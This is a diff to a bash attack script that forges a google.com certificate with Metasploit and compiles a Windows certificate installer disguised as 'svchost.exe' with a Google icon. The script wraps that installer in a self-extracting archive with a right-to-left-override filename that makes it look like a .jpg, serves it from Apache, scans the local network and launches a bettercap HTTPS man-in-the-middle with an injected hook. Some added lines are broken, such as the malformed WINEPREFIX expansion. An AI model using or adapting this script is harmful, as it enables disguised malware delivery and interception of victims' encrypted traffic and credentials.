@@ -49,12 +49,13 @@ set -euo pipefail
 RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
 color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 
+rm -rf ~/.wine
+WINEARCH=win64 wineboot --init
 MITM_DIR="/tmp/mitm"
-WINEPREFIX="${WINEPREFIX:-$HOME/.wine}"
+WINEPREFIX="${$HOME/.wine}"
 MSF_LOOT="$HOME/.msf4/loot"
 BUILD_DIR="$WINEPREFIX/drive_c/pyinstaller-build"
 ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
-TARGET_HOST="google.com"
 
 # ========================
 # --- ROOT CHECK ---
@@ -65,7 +66,17 @@ if [[ "$(id -u)" -ne 0 ]]; then
 fi
 
 # ========================
-# --- NET INFO ---
+# --- PYTHON CHECK ---
+# ========================
+if [ ! -d "$WINEPREFIX/drive_c/pyinstaller-build" ]; then
+    wget https://www.python.org/ftp/python/3.9.1/python-3.9.1-amd64.exe -O /tmp/python39.exe
+    wine /tmp/python39.exe
+    wine python -m pip install --upgrade pip setuptools wheel
+    wine python -m pip install pyinstaller
+fi
+
+# ========================
+# --- NETWORK INFO ---
 # ========================
 IFACE=$(ip route | awk '/^default/ {print $5; exit}')
 LAN=$(ip -4 addr show "$IFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)
@@ -73,35 +84,33 @@ color_print GREEN "[*] Interface: $IFACE"
 color_print GREEN "[*] Local IP: $LAN"
 
 # ========================
-# --- CLEANUP ---
+# --- CLEANUP OLD FILES ---
 # ========================
 color_print YELLOW "[*] Cleaning old files..."
 rm -rf "$MITM_DIR" "$MSF_LOOT"/* "$BUILD_DIR"
 mkdir -p "$MITM_DIR" "$BUILD_DIR"
 
 # ========================
-# --- CERTIFICATE ---
+# --- GENERATE FAKE CERTIFICATE ---
 # ========================
 color_print CYAN "[*] Generating fake certificate..."
-msfconsole -qx "use auxiliary/gather/impersonate_ssl; set RHOSTS $TARGET_HOST; run; exit"
+msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS google.com;run;exit"
 sleep 1
-
 CERT_CRT=$(find "$MSF_LOOT" -type f -name "*.crt" | head -1)
 CERT_KEY=$(find "$MSF_LOOT" -type f -name "*.key" | head -1)
-
 cp -f "$CERT_CRT" "$MITM_DIR/ca.crt"
 cp -f "$CERT_KEY" "$MITM_DIR/ca.key"
 openssl x509 -in "$MITM_DIR/ca.crt" -out "$MITM_DIR/ca.pem"
 
 # ========================
-# --- ICON ---
+# --- CREATE ICON ---
 # ========================
 color_print CYAN "[*] Downloading & creating icon..."
 wget -q -O "$MITM_DIR/google.jpg" "$ICON_URL"
 convert "$MITM_DIR/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "$MITM_DIR/google.ico"
 
 # ========================
-# --- PY INSTALLER ---
+# --- BUILD WINDOWS INSTALLER ---
 # ========================
 color_print GREEN "[*] Building Windows installer..."
 CERT_B64=$(base64 -w0 "$MITM_DIR/ca.crt")
@@ -144,17 +153,15 @@ EOF
 cp "$MITM_DIR/cert-installer.py" "$BUILD_DIR/cert_installer.py"
 cp "$MITM_DIR/google.ico" "$BUILD_DIR/google.ico"
 
-wine python -m pip install --upgrade pip setuptools wheel
-wine python -m pip install pyinstaller
 wine pyinstaller --onefile --noconfirm --noconsole \
     --icon "C:\\pyinstaller-build\\google.ico" \
     --name "svchost.exe" \
     "C:\\pyinstaller-build\\cert_installer.py"
 
-cp "$WINEPREFIX/drive_c/users/$USER/dist/svchost.exe" "$MITM_DIR/svchost.exe"
+cp -r "$HOME/.wine/drive_c/pyinstaller-build/build/svchost.exe" "$MITM_DIR/svchost.exe"
 
 # ========================
-# --- RAR SFX ---
+# --- CREATE RAR SFX ---
 # ========================
 color_print CYAN "[*] Creating SFX archive..."
 cat > "$MITM_DIR/sfx.txt" <<EOF
@@ -171,13 +178,13 @@ cd "$MITM_DIR"
 rar a -sfx -z"$MITM_DIR/sfx.txt" "/var/www/html/google-update-%E2%80%AEexe.jpg" "$MITM_DIR/svchost.exe"
 
 # ========================
-# --- APACHE ---
+# --- RESTART APACHE ---
 # ========================
 color_print GREEN "[*] Restarting Apache..."
 service apache2 restart
 
 # ========================
-# --- HOOK & CAPLET ---
+# --- GENERATE HOOK.JS & CAPLET ---
 # ========================
 color_print CYAN "[*] Scanning network..."
 TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain |
@@ -213,7 +220,7 @@ https.proxy on
 EOF
 
 # ========================
-# --- BETTERCAP ---
+# --- LAUNCH BETTERCAP ---
 # ========================
 color_print GREEN "[*] Launching Bettercap..."
 bettercap -iface "$IFACE" -caplet "$MITM_DIR/fallback.cap"
